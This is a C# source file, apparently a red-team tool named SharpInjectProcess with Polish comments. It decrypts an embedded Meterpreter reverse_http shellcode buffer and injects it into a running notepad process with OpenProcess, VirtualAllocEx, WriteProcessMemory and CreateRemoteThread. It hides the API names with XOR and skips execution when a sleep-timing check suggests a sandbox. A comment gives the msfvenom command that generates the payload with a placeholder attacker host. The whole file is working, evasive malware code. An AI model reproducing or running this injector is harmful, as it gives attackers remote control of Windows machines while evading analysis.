using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpInjectProcess
{

    public class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // VirtualAlloc
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // CreateThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // WaitForSingleObject
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        // OpenProcess
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        // VirtualAllocEx
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // WriteProcessMemory
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool Type_WriteProcessMemory(IntPtr hprocess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // CreateRemoteThread
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddresss, IntPtr lpParameter, uint DwCreationFlags, out IntPtr lpThreadId );

        // MessageBox
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr Type_MessageBox(IntPtr hWnd, String text, String caption, uint type);


        // Ponizej funkcja o nazwie addworkstation ktora przyjmuje zaxorowany strumien bajtow, odxorowuje go i zwraca string
        public static string addworkstation(byte[] data)
        {
            byte[] adduser = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                adduser[i] = (byte)(data[i] ^ 0xa0);
            }
            return Encoding.Default.GetString(adduser);
        }

        // ponizej funkcja o nazwie helloworld ktora przyjmuje zaxorowany strumien bajtow, string klucz i zwraca odxorowany strumien bajtow
        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i=0; i<e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i%key_bytes.Length]);
            }


            return d_buf;
        }

        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if(t2 < 1.5)
            {
                return;
            }
            else
            {
                Execute();
            }
        }




        public static void Execute()
        {
            const uint DELETE = 0x00010000;
            const uint READ_CONTROL = 0x00020000;
            const uint WRITE_DAC = 0x00040000;
            const uint WRITE_OWNER = 0x00080000;
            const uint SYNCHRONIZE = 0x00100000;
            const uint END = 0xFFF;
            const uint PROCESS_ALL_ACCESS = (DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

            // Ponizej Twoj shellcode! msfvenom -p windows/x64/meterpreter/reverse_http --encrypt xor  --encrypt-key siemanko LHOST=192.168.y.x LPORT=8080 -f csharp
            byte[] buf = new byte[642] {0x8f,0x21,0xe6,0x89,0x91,0x86,
0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x27,0x42,0xbb,
0x34,0x08,0x29,0xe5,0x39,0x0f,0x25,0x21,0xee,0x3f,0x79,0x26,
0xe0,0x3d,0x53,0x21,0x6a,0xda,0x2b,0x24,0x26,0x5e,0xba,0x21,
0xee,0x1f,0x31,0x26,0x5a,0xaf,0xdf,0x55,0x04,0x11,0x63,0x42,
0x4b,0x2e,0xb2,0xa0,0x68,0x2c,0x60,0xaf,0x89,0x82,0x21,0x28,
0x34,0x25,0xea,0x3c,0x4b,0xe4,0x31,0x55,0x2d,0x6c,0xb1,0x08,
0xea,0x17,0x6b,0x62,0x67,0x62,0xe4,0x1c,0x6b,0x6f,0x73,0xe2,
0xe5,0xe5,0x61,0x6e,0x6b,0x27,0xf6,0xa9,0x11,0x0a,0x29,0x6f,
0xbb,0x3f,0xf8,0x21,0x7d,0x29,0xea,0x2e,0x4b,0x26,0x72,0xb9,
0x86,0x3b,0x2c,0x5f,0xa2,0x27,0x8c,0xa0,0x24,0xe6,0x55,0xe6,
0x23,0x6e,0xa5,0x21,0x54,0xad,0xcd,0x2f,0xaa,0xa6,0x7e,0x28,
0x64,0xac,0x59,0x8e,0x1e,0x9e,0x3f,0x6a,0x29,0x49,0x69,0x2b,
0x52,0xbe,0x06,0xb1,0x3d,0x29,0xea,0x2e,0x4f,0x26,0x72,0xb9,
0x03,0x2c,0xea,0x62,0x23,0x2b,0xf8,0x29,0x79,0x24,0x60,0xbe,
0x2a,0xe4,0x77,0xe1,0x24,0x35,0x29,0x6f,0xbb,0x2e,0x2b,0x37,
0x3c,0x37,0x20,0x36,0x2a,0x36,0x32,0x33,0x2d,0xee,0x8d,0x4e,
0x2a,0x3d,0x8c,0x89,0x3d,0x2c,0x38,0x34,0x23,0xe4,0x61,0x80,
0x2e,0x92,0x9e,0x91,0x36,0x27,0x42,0xb2,0x36,0x24,0xdf,0x19,
0x02,0x01,0x1a,0x07,0x00,0x19,0x61,0x2f,0x3d,0x27,0xfa,0x88,
0x2c,0xaa,0xa3,0x22,0x1c,0x49,0x74,0x96,0xb0,0x3e,0x32,0x26,
0xe2,0x8e,0x20,0x33,0x28,0x5c,0xa1,0x23,0x5a,0xa6,0x20,0x3a,
0x2c,0xd7,0x5b,0x38,0x12,0xc8,0x73,0x69,0x65,0x6d,0x9e,0xbb,
0x83,0x7f,0x73,0x69,0x65,0x5c,0x58,0x5c,0x45,0x5e,0x45,0x51,
0x4b,0x5c,0x53,0x57,0x45,0x5e,0x47,0x5a,0x65,0x37,0x29,0xe7,
0xaa,0x26,0xb4,0xa9,0xf5,0x72,0x61,0x6e,0x26,0x5e,0xba,0x3a,
0x36,0x07,0x62,0x3d,0x22,0xd5,0x24,0xe0,0xfa,0xab,0x61,0x6e,
0x6b,0x6f,0x8c,0xbc,0x8d,0x14,0x61,0x6e,0x6b,0x40,0x00,0x05,
0x22,0x3d,0x3b,0x17,0x3e,0x1d,0x0b,0x0a,0x12,0x38,0x58,0x3c,
0x33,0x5c,0x10,0x3e,0x24,0x5e,0x28,0x2f,0x13,0x18,0x1f,0x0e,
0x5c,0x23,0x26,0x2d,0x34,0x3b,0x09,0x24,0x51,0x58,0x0b,0x1a,
0x00,0x0b,0x3e,0x2b,0x11,0x00,0x39,0x3d,0x11,0x1c,0x3b,0x31,
0x1d,0x0c,0x38,0x20,0x2a,0x3b,0x21,0x2f,0x54,0x29,0x26,0x08,
0x5d,0x42,0x45,0x26,0x48,0x00,0x36,0x20,0x02,0x5f,0x3a,0x25,
0x36,0x09,0x0e,0x08,0x59,0x27,0x46,0x24,0x54,0x27,0x07,0x1c,
0x2f,0x0e,0x16,0x3f,0x56,0x02,0x36,0x1d,0x1e,0x0b,0x25,0x0a,
0x57,0x40,0x0c,0x3c,0x5b,0x08,0x1a,0x38,0x54,0x26,0x0a,0x59,
0x3e,0x57,0x18,0x19,0x06,0x2c,0x51,0x03,0x52,0x6f,0x3b,0xe0,
0xa4,0x3e,0x3b,0x2f,0x33,0x22,0x42,0xa0,0x36,0x25,0xd9,0x6e,
0x69,0x47,0xf7,0x69,0x65,0x6d,0x61,0x3e,0x38,0x3c,0x3a,0xae,
0xa7,0x86,0x34,0x40,0x50,0x90,0xa6,0x21,0xec,0xab,0x0b,0x64,
0x34,0x3c,0x29,0x21,0xec,0x9c,0x2c,0x5f,0xa2,0x22,0x42,0xa0,
0x36,0x3e,0x28,0xa9,0xa9,0x42,0x75,0x71,0x1e,0x92,0xb4,0xeb,
0xab,0x1a,0x6c,0x21,0xa2,0xac,0xe9,0x7d,0x6b,0x6f,0x3a,0xd3,
0x21,0x9d,0x54,0x8e,0x6b,0x6f,0x73,0x69,0x9a,0xb8,0x29,0x91,
0xa4,0x1b,0x71,0x82,0xa9,0x85,0x34,0x6e,0x6b,0x6f,0x20,0x30,
0x0f,0x2d,0x3b,0x27,0xe2,0xbe,0xb2,0x8b,0x75,0x24,0xa6,0xae,
0x6b,0x7f,0x73,0x69,0x2c,0xd7,0x39,0xca,0x38,0x8a,0x73,0x69,
0x65,0x6d,0x9e,0xbb,0x23,0xfc,0x20,0x3a,0x2d,0xe4,0x86,0x26,
0xe2,0x9e,0x3b,0xe0,0xbf,0x24,0xa6,0xae,0x6b,0x4f,0x73,0x69,
0x2c,0xe4,0x98,0x27,0xd1,0x7d,0xe5,0xe0,0x87,0x6d,0x61,0x6e,
0x6b,0x90,0xa6,0x21,0xe6,0xa9,0x41,0xeb,0xab,0x1b,0xc1,0x0f,
0xee,0x6a,0x29,0x6f,0xa8,0xea,0xb3,0x1c,0xb7,0x35,0xa2,0x36,
0x01,0x6f,0x2a,0x20,0xa2,0xaf,0x91,0xdb,0xc9,0x39,0x8c,0xbc
};

            buf = helloworld(buf, "siemanko");

            int buflen = buf.Length + 1;
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}

            // Zaladowanie biblioteki user32.dll i kernel32.dll
            string user32dll = "user32.dll";
            string kernel32dll = "kernel32.dll";
            IntPtr huser32dll = LoadLibrary(user32dll);
            IntPtr hkernel32dll = LoadLibrary(kernel32dll);

            // Znalezienie wskaznika na funkcje MessageBoxA
            //string strMessageBox = "MessageBoxA";
            //IntPtr hMessageBox = GetProcAddress(huser32dll, strMessageBox);
            //Type_MessageBox mb = (Type_MessageBox)Marshal.GetDelegateForFunctionPointer(hMessageBox, typeof(Type_MessageBox));
            //mb(IntPtr.Zero, "Justtest", "Justfortest", 0);


            // znalezienie wskaznika na OpenProcess i zdefiniowanie open process
            byte[] e_op = { 0xef, 0xd0, 0xc5, 0xce, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3 };
            IntPtr hOpenProcess = GetProcAddress(hkernel32dll, addworkstation(e_op));   
            Type_OpenProcess op = (Type_OpenProcess)Marshal.GetDelegateForFunctionPointer(hOpenProcess, typeof(Type_OpenProcess));

            // znalezienie wskaznika na VirtualAllocEx i zdefiniowanie VirtualAllocEx
            byte[] e_vax = { 0xf6, 0xc9, 0xd2, 0xd4, 0xd5, 0xc1, 0xcc, 0xe1, 0xcc, 0xcc, 0xcf, 0xc3, 0xe5, 0xd8 };
            IntPtr hVirtualAllocEx = GetProcAddress(hkernel32dll , addworkstation(e_vax));
            Type_VirtualAllocEx vax = (Type_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(hVirtualAllocEx, typeof(Type_VirtualAllocEx));


            // Znalezienie wskaznikana WriteProcessMemory i zdefiniowanie WriteProcessMemory
            byte[] e_wpm = { 0xf7, 0xd2, 0xc9, 0xd4, 0xc5, 0xf0, 0xd2, 0xcf, 0xc3, 0xc5, 0xd3, 0xd3, 0xed, 0xc5, 0xcd, 0xcf, 0xd2, 0xd9 };
            IntPtr hWritePricessMemory = GetProcAddress(hkernel32dll, addworkstation(e_wpm));
            Type_WriteProcessMemory wpm = (Type_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(hWritePricessMemory, typeof(Type_WriteProcessMemory));


            // Znalezienie Wskaznika na CreateRemoteThread i zdefiniowanie CreateRemoteThread
            byte[] e_crm = { 0xe3, 0xd2, 0xc5, 0xc1, 0xd4, 0xc5, 0xf2, 0xc5, 0xcd, 0xcf, 0xd4, 0xc5, 0xf4, 0xc8, 0xd2, 0xc5, 0xc1, 0xc4 };
            IntPtr hCreateRemoteThread = GetProcAddress(hkernel32dll, addworkstation(e_crm));
            Type_CreateRemoteThread crt = (Type_CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(hCreateRemoteThread, typeof(Type_CreateRemoteThread));

            // Tu wpisz do jakiego procesu chcesz wstrzyknac ShellCode
            Process[] processes = Process.GetProcessesByName("notepad");
            int pid = processes[0].Id;

            IntPtr prochandle = op(PROCESS_ALL_ACCESS, false, (uint)pid);
            IntPtr memaddr = vax(prochandle, IntPtr.Zero, (uint)buflen, 0x3000, 0x40);
            //int bytesWritten = 0;
            wpm(prochandle, memaddr, buf, buflen, out var bytesWritten);
            IntPtr hcrt = crt(prochandle, IntPtr.Zero, 0, memaddr, IntPtr.Zero, 0, out var lpThreadId);
            

        }

        public static void Main(string[] args)
        {
            amireal();
        }
    }
}
